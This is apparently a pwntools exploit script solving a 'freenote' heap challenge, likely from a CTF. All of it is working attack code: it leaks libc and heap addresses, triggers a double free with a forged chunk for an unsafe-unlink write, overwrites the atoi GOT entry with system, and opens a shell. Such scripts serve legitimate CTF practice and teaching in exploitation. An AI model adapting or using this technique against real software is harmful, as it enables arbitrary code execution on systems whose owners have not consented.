from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./freenote"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice: ",str(idx))

def add(len,note):
    opt(2)
    p.sendlineafter("Length of new note: ",str(len))
    p.sendlineafter("Enter your note: ",str(note))

def list():
    opt(1)

def edit(idx,len,note):
    opt(3)
    p.sendlineafter("Note number: ",str(idx))
    p.sendlineafter("Length of note: ",str(len))
    p.sendlineafter("Enter your note: ",str(note))

def free(idx):
    opt(4)
    p.sendlineafter("Note number: ",str(idx))

# leak libc addr by main arena
add(8,"a"*8)
add(8,"a"*8)
free(0)
add(8,"a"*8)
list()
p.recvuntil("0. aaaaaaaa")
call_back = u64(p.recv(6).ljust(8,"\0"))
libc_offset = 0x3c4b78
libc_base = call_back - libc_offset
system_addr = libc_base + libc.sym["system"]

free(1)
free(0)

# leak heap addr
add(8,"a"*8)
add(8,"a"*8)
add(8,"a"*8)
add(8,"a"*8)
free(0)
free(2)
add(8,"c"*8)
list()
p.recvuntil("0. cccccccc")
call_back = u64(p.recv(3).ljust(8,"\0"))
heap_offset = 0x1940
heap_base = call_back - heap_offset
log.success("heap_base addr is -> " + hex( heap_base ))
free(3)
free(0)
free(1)

# double free
add(128,"a"*127)
add(128,"a"*127)
add(128,"a"*127)
free(2)
free(1)
free(0)

x = 0x603030
fake_fd = x-0x18
fake_bk = x-0x10
payload = flat([
    0,0x81,
    fake_fd,fake_bk,
    "a"*0x60,
    0x80,0x90,
    "1"*0x80,0,
    0x91,"\x00"*0x60
    ])

add(len(payload),payload)
free(1)

payload = flat([
    2,1,8,elf.got["atoi"]
    ]).ljust(0x180,"a")
edit(0,len(payload),payload)

payload = p64(system_addr)

edit(0,8,payload)

p.sendline("/bin/sh\x00")
# gdb.attach(p,"set $h=0x604820,$g=0x603010")

p.interactive()
